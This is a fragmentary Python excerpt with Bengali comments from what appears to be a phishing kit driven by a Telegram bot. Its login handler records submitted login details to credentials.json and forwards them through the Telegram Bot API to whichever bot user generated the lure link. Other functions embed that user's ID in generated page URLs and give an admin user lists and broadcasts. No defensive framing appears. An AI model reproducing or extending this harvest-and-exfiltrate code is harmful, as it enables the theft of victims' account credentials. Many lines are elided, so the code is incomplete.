...
def handle_login():
    ...
    target_user_id = request.args.get('user_id', 'unknown')  # যে ইউজার লিংক জেনারেট করেছে
    ...
    data = {
        ...
        'generated_by': target_user_id  # কে লিংক জেনারেট করেছে
    }
    
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    # ✅ শুধু সেই ইউজারকে মেসেজ পাঠান (যে লিংক জেনারেট করেছে)
    if target_user_id != 'unknown':
        send_to_specific_user(data, target_user_id)
...
def send_to_specific_user(data, user_id):
    """শুধু নির্দিষ্ট ইউজারকে লগইন তথ্য পাঠায় (যে লিংক জেনারেট করেছে)"""
    platform_names = {
...
"""
    ...
    try:
        requests.post(url, json={'chat_id': int(user_id), 'text': message}, timeout=5)
        print(f"✅ Login info sent to user: {user_id}")
    except Exception as e:
        print(f"❌ Failed to send: {e}")

def broadcast_to_all(message_text):
    """✅ অ্যাডমিনের ব্রডকাস্ট - সব ইউজারকে মেসেজ যায়"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    success_count = 0
...
active_users = set()
user_details = {}  # {chat_id: {'name': '', 'username': '', 'joined': ''}}
...
async def show_page(update: Update, context: ContextTypes.DEFAULT_TYPE, title: str, url_path: str, back_callback: str, page_type: str):
    ...
    # ✅ যে ইউজার বাটন ক্লিক করছে, তার আইডি URL-এ যোগ করা হচ্ছে
...
async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """✅ অ্যাডমিনের জন্য: সব ইউজারের তালিকা দেখান"""
...
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # ✅ অ্যাডমিন ব্রডকাস্ট - সবাইকে মেসেজ যায়
